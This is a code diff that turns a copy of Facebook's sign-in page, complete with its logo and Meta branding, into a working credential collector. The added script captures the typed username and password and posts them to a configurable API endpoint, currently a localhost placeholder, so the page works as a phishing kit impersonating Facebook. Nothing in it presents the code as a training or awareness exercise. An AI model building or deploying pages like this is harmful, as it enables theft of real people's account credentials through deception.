@@ -82,12 +82,43 @@
 <body>
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
-    <input type="text" placeholder="Mobile number or email">
-    <input type="password" placeholder="Password">
-    <button class="login-btn">Sign in</button>
-    <a href="#" class="link">Forgot password?</a>
-    <button class="create-btn">Create new account</button>
+     <form id="myForm">
+       <input type="text" id="username" placeholder="Mobile number or email">
+       <input type="password" id="password" placeholder="Password">
+       <button type="submit" class="login-btn">Sign in</button>
+       <a href="#" class="link">Forgot password?</a>
+       <button class="create-btn">Create new account</button>
+     </form>
     <div class="meta">Meta</div>
   </div>
+   <p id="responseMessage"></p>
+
+  <script>
+    document.getElementById('myForm').addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent form from submitting the default way
+
+      const data = {
+        username: document.getElementById('username').value,
+        email: document.getElementById('password').value
+      };
+
+      console.log('Form submitted:', data);
+
+      fetch('http://localhost:5000/api/users', {  // Replace with your API endpoint
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(result => {
+        document.getElementById('responseMessage').innerText = 'Success: ' + JSON.stringify(result);
+      })
+      .catch(error => {
+        document.getElementById('responseMessage').innerText = 'Error: ' + error;
+      });
+    });
+  </script>
 </body>
 </html>
